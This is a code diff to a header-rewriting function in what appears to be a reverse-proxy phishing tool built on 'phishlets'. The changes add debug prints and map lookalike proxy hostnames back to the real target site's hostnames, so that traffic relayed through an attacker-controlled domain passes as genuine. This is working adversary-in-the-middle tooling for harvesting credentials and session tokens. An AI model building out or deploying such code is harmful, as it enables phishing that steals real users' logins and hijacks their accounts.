@@ -2,6 +2,7 @@
 
 
 def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
+    
     # print(f"commin headers: {headers}")
     # Convert CIMultiDictProxy to regular dict if needed
     if hasattr(headers, 'getall'):
@@ -22,6 +23,19 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
     if phishlet_data and any(host.get('reverce_filter', False) for host in phishlet_data.get('hosts_to_proxy', [])):
         # Build replacement mapping: proxy_hostname -> original_hostname
         hosts_to_proxy = phishlet_data.get('hosts_to_proxy', [])
+        print(f"\n ---- hosts_to_proxy: {hosts_to_proxy}")
+        print(f"\n ---- proxy_host parameter: {proxy_host}")
+        
+        # Extract base domain from proxy_host (e.g., 'test.xx.in' -> 'xx.in')
+        base_domain = proxy_host
+        if '.' in proxy_host:
+            # Split by dots and take the last two parts for the base domain
+            parts = proxy_host.split('.')
+            if len(parts) >= 2:
+                base_domain = '.'.join(parts[-2:])
+        
+        print(f"\n ---- extracted base_domain: {base_domain}")
+        
         replacement_map = {}
         
         for host_entry in hosts_to_proxy:
@@ -37,18 +51,21 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
             
             # Build the proxy hostname that should be replaced
             if proxy_subdomain:
-                proxy_hostname = f"{proxy_subdomain}.{proxy_host}"
+                proxy_hostname = f"{proxy_subdomain}.{base_domain}"
             else:
-                proxy_hostname = proxy_host
+                proxy_hostname = base_domain
             
             # Build the original hostname to replace with
             # Use the host field directly - it already contains the full hostname
             original_hostname = original_host
             
             replacement_map[proxy_hostname] = original_hostname
+            
+        print(f"\n ---- replacement_map: {replacement_map}")
         
         # Sort by length (longest first) to ensure specific subdomains are processed before base domains
         sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
+        print(f"Sorted replacements: {sorted_replacements}")
         
         # Apply replacements to headers
         for key, value in headers_dict.items():
@@ -129,7 +146,23 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
                         new_values.append(v)
                 headers_dict[key] = new_values
     
-    # print(f"patched headers: {headers_dict}")
+    print(f"phishlet_data_for_headers: {phishlet_data} \n")
+    # one more tim go throught all headers and replace proxy host domain with target host domain\
+    proxy_domain = phishlet_data.get('proxy_domain', '')
+    target_url = phishlet_data.get('target_url', '')
+    target_domain = target_url.split('//')[1].split('/')[0]
+    print(f"proxy_host: {proxy_domain}, target_host: {target_domain}")
+    # for key, value in headers_dict.items():
+    #     if isinstance(value, str) and proxy_domain in value:
+    #         headers_dict[key] = value.replace(proxy_domain, target_domain)
+    #     elif isinstance(value, (list, tuple)):
+    #         new_values = []
+    #         for v in value:
+    #             if isinstance(v, str) and proxy_host in v:
+    #                 new_values.append(v.replace(proxy_host, target_host))
+    #             else:
+    #                 new_values.append(v)
+    #         headers_dict[key] = new_values
     return headers_dict
 
 def patch_headers_in(headers, proxy_host, target_host):
